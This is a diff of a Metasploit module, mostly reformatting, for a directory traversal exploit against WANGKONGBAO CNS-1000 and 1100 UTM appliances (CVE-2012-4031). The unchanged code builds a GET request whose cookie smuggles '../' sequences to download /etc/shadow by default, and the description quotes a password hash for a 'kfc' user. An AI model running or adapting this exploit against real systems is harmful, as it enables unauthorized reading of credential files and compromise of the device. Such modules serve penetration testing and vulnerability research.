@@ -8,34 +8,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal',
+        'Description' => %q{
           This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka
-        Network Security Platform. This directory traversal vulnerability is interesting
-        because the apache server is running as root, this means we can grab anything we
-        want! For instance, the /etc/shadow and /etc/passwd files for the special
-        kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user
-      },
-      'References'     =>
-        [
+          Network Security Platform. This directory traversal vulnerability is interesting
+          because the apache server is running as root, this means we can grab anything we
+          want! For instance, the /etc/shadow and /etc/passwd files for the special
+          kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user
+        },
+        'References' => [
           ['CVE', '2012-4031'],
           ['EDB', '19526']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Dillon Beresford'
         ],
-      'License'        =>  MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(85),
         OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 10])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -46,17 +53,17 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     travs = "../" * datastore['DEPTH']
-    travs = travs[0,travs.rindex('/')]
+    travs = travs[0, travs.rindex('/')]
 
     # Create request
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/src/acloglogin.php",
+      'uri' => "/src/acloglogin.php",
       'headers' =>
         {
           'Connection' => "keep-alive",
           'Accept-Encoding' => "zip,deflate",
-          'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + travs + datastore['FILEPATH'] + "/."*4043
+          'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + travs + datastore['FILEPATH'] + "/." * 4043
         },
     }, 25)
 
